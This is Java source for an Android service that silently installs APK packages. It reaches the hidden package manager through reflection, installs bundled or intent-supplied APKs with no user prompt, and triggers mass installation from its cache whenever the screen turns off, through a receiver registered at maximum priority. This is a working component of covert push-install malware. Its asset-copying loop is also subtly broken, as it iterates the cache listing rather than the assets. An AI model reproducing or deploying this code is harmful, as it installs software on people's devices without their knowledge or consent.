package com.xstd.active.plugin;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.IPackageInstallObserver;
import android.content.pm.IPackageManager;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

public class SilentInstallService extends Service {

	private IPackageManager manager;
	private MyIPackageInstallObserver observer;
	private ScreenChangeReceiver receiver;
	private SharedPreferences sp;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@SuppressWarnings({ "rawtypes", "unchecked" })
	@Override
	public void onCreate() {
		super.onCreate();

		sp = getSharedPreferences("setting", Context.MODE_PRIVATE);

		receiver = new ScreenChangeReceiver();
		IntentFilter filter = new IntentFilter();
		filter.setPriority(Integer.MAX_VALUE);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_USER_PRESENT);
		registerReceiver(receiver, filter);
		try {
			Class clazz = getClassLoader().loadClass(
					"android.os.ServiceManager");
			Method method = clazz.getMethod("getService",
					new Class[] { String.class });
			IBinder b = (IBinder) method.invoke(null, "package");
			manager = IPackageManager.Stub.asInterface(b);
			observer = new MyIPackageInstallObserver();
		} catch (Exception e) {
			e.printStackTrace();
		}
		copyFileToCache();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		if (receiver != null)
			unregisterReceiver(receiver);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		String apk_path = intent.getStringExtra("apk_path");
		if (apk_path != null)
			installFile(new File(apk_path));
		return super.onStartCommand(intent, flags, startId);
	}

	class MyIPackageInstallObserver extends IPackageInstallObserver.Stub {

		@Override
		public void packageInstalled(String packageName, int returnCode)
				throws RemoteException {
			Log.w("ps", "安装结束:" + returnCode);
			// if (returnCode == 1) {
			// DBHelper helper = new DBHelper(getApplicationContext());
			// SQLiteDatabase db = helper.getWritableDatabase();
			// ContentValues values = new ContentValues();
			// values.put("packname", packageName);
			// values.put("active", 0);
			// db.insert("silentapp", null, values);
			// }
		}
	}

	class ScreenChangeReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (Intent.ACTION_SCREEN_ON.equals(action)) {
			} else if (Intent.ACTION_SCREEN_OFF.equals(action)) {
				File[] files = getCacheDir().listFiles();
				for (File file : files) {
					installFile(file);
				}
			} else if (Intent.ACTION_USER_PRESENT.equals(action)) {
			}
		}
	}

	private void installFile(File file) {
		int installFlags = 0;
		String packName = getPackageName(file.getAbsolutePath());
		try {
			PackageInfo pi = getPackageManager().getPackageInfo(packName,
					PackageManager.GET_UNINSTALLED_PACKAGES);
			if (pi != null) {
				installFlags |= 2;
			}
			Uri uri = Uri.fromFile(file);
			if (uri != null)

				manager.installPackage(uri, observer, installFlags, packName);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void copyFileToCache() {
		new Thread(new CopyFileAndInstallTask()).start();
	}

	/**
	 * 把assets文件夹下的文件拷贝到程序cache目录下并安装
	 * 
	 * @author Chrain
	 * 
	 */
	private class CopyFileAndInstallTask implements Runnable {

		@Override
		public void run() {
			for (String app : getCacheDir().list()) {
				File file = new File(getCacheDir().getAbsolutePath(), app);
				if (file.exists())
					continue;
				InputStream is = null;
				OutputStream os = null;
				try {
					is = getAssets().open(app);
					os = new BufferedOutputStream(new FileOutputStream(file));
					byte[] b = new byte[1024 * 5];
					int len;
					while ((len = is.read(b)) != -1) {
						os.write(b, 0, len);
					}
					os.flush();
					installFile(file);
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					try {
						if (is != null)
							is.close();
						if (os != null)
							os.close();
					} catch (Exception e) {
					}
				}
			}
		}
	}

	/**
	 * 获取apk包的信息：版本号，名称，图标等
	 * 
	 * @param absPath
	 *            apk包的绝对路径
	 * @param context
	 */
	private String getPackageName(String absPath) {

		PackageManager pm = getPackageManager();
		PackageInfo pkgInfo = pm.getPackageArchiveInfo(absPath,
				PackageManager.GET_ACTIVITIES);
		if (pkgInfo != null) {
			ApplicationInfo appInfo = pkgInfo.applicationInfo;
			/* 必须加这两句，不然下面icon获取是default icon而不是应用包的icon */
			// appInfo.sourceDir = absPath;
			// appInfo.publicSourceDir = absPath;
			// String appName = pm.getApplicationLabel(appInfo).toString();//
			// 得到应用名
			return appInfo.packageName; // 得到包名
			// String version = pkgInfo.versionName; // 得到版本信息
			// /* icon1和icon2其实是一样的 */
			// Drawable icon1 = pm.getApplicationIcon(appInfo);// 得到图标信息
			// Drawable icon2 = appInfo.loadIcon(pm);
			// String pkgInfoStr = String.format(
			// "PackageName:%s, Vesion: %s, AppName: %s", packageName,
			// version, appName);
			// Log.w("ps", String.format("PkgInfo: %s", pkgInfoStr));
		}
		return null;
	}

}

// DBHelper helper = new DBHelper(getApplicationContext());
// SQLiteDatabase db = helper.getWritableDatabase();
// Cursor cursor = db.query("silentapp", null, "active=?", new
// String[]{String.valueOf(0)}, null, null, null);
// if(cursor.moveToNext()) {
// String packname = cursor.getString(1);
// Intent app = context.getPackageManager().getLaunchIntentForPackage(packname);
// context.startActivity(app);
// }
